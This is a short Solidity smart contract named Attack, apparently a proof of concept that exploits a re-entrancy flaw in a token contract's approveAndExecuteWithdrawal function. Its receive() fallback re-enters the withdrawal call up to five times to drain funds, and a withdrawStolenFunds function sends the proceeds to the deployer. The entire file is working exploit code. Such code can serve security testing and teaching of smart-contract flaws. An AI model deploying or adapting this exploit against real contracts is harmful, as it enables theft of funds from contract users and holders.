// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IMyToken {
    function approveAndExecuteWithdrawal(uint256 _requestId) external;
}

contract Attack {
    IMyToken public immutable myToken;
    address public immutable owner;

    uint public attackCount = 0; 

    uint256 public lastRequestIdToAttack;
    
    constructor(address _myTokenAddress) {
        myToken = IMyToken(_myTokenAddress);
        owner = msg.sender;
    }
    
    function startAttack(uint256 _requestId) external {
        require(msg.sender == owner, "Only the owner can start the attack");

        lastRequestIdToAttack = _requestId;
        attackCount = 0;

        myToken.approveAndExecuteWithdrawal(_requestId);
    }

    //Re-entrancy
    receive() external payable {
        attackCount++;
        if (attackCount < 5) {
            myToken.approveAndExecuteWithdrawal(lastRequestIdToAttack);
        }
    }

    function withdrawStolenFunds() external {
        require(msg.sender == owner, "Only the owner can withdraw");
        (bool success, ) = owner.call{value: address(this).balance}("");
        require(success, "Failed to withdraw funds");
    }
}